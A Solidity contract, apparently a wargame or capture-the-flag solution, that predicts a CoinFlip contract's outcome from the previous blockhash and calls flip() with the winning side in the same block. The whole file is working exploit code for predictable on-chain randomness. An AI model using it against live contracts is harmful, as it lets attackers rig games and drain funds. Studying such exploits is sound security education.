// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    /*
    It is possible for a smart contract to call another smart contract, 
    each transaction sent completing its execution within the same block 
    even when the transaction involves execution across multiple smart contracts. 
    */
    function hackContract() public payable {
        // calculate the result
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // call the real function
        CoinFlip coinflip = CoinFlip(contractAddress);
        coinflip.flip(side);
    }
}
